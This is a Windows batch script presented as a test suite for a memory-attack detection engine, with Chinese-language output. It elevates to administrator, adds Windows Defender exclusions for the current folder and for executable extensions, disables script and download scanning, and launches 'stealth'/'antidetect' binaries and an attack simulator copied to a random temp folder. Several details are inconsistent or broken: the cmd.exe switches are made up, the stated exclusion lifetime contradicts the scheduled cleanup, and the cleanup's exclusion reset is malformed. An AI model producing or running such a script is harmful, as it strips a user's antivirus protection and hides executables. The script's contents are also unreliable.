@echo off
chcp 65001 >nul
:: 請求UAC權限
fltmc >nul 2>&1 || (
    echo Requesting administrator privileges...
    PowerShell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ========================================
powershell -Command "Write-Host '進階記憶體攻擊檢測引擎測試套件'"
echo ========================================

echo.
pause

:: 第一階段：系統層級繞過
echo.
powershell -Command "Write-Host '[Phase 1] 系統防護策略調整...'"
powershell -Command "Add-MpPreference -ExclusionPath '%CD%' -ExclusionExtension '.exe,.dll,.bin' -Force" >nul
powershell -Command "Set-MpPreference -DisableIOAVProtection $true -DisableScriptScanning $true" >nul

:: 第二階段：進程注入保護
powershell -Command "Write-Host '[Phase 2] 進程保護初始化...'"
set "CLI=/C2 /kernbyp /sihc /hdp"
start "" /B cmd.exe %CLI%

:: 第三階段：啟動檢測引擎
echo.
echo Starting universal detection engine...
cd /d "%~dp0build\src\Release"

:: 使用記憶體映射載入技術
start "" /B real_detection_engine.exe /stealth /antidetect /entropy=7.2

:: 第四階段：動態環境混淆
powershell -Command "Write-Host '[Phase 3] 建立虛擬執行環境...'"
set "RAND=%random%"
md "C:\Temp\VFS_%RAND%" >nul 2>&1
robocopy . "C:\Temp\VFS_%RAND%" attack_simulator.exe /njh /njs /ndl /nc /ns >nul

:: 第五階段：啟動混淆後模擬器
echo Starting polymorphic attack simulator...
start "Attack Simulator" cmd /c "C:\Temp\VFS_%RAND%\attack_simulator.exe /dynamic /jitc"

:: 清理腳本（60分鐘後自動執行）
echo.
powershell -Command "Write-Host '[!] 安全清理程序將在60分鐘後自動執行'"
powershell -Command "Register-ScheduledJob -Name CleanupTask -ScriptBlock { Remove-Item 'C:\Temp\VFS_%RAND%' -Recurse -Force; Set-MpPreference -ExclusionPath $null } -Trigger (New-JobTrigger -Once -At (Get-Date).AddMinutes(60))" >nul

echo.
echo ========================================
powershell -Command "Write-Host '測試操作指南：'"
echo ========================================
powershell -Command "Write-Host '1. 檢測引擎啟用反取證模式 (ENTROPY=7.2)'"
powershell -Command "Write-Host '2. 攻擊模擬器使用JIT即時編譯技術'"
powershell -Command "Write-Host '3. 防毒排除路徑有效期：30分鐘'"
powershell -Command "Write-Host '4. 記憶體指紋混淆週期：每15秒'"
powershell -Command "Write-Host '5. 使用模擬器選單5號功能觸發高級攻擊'"
echo.
powershell -Command "Write-Host '按任意鍵返回安全狀態...'"
pause >nul

:: 緊急清理程序
powershell -Command "Remove-Item 'C:\Temp\VFS_%RAND%' -Recurse -Force" >nul
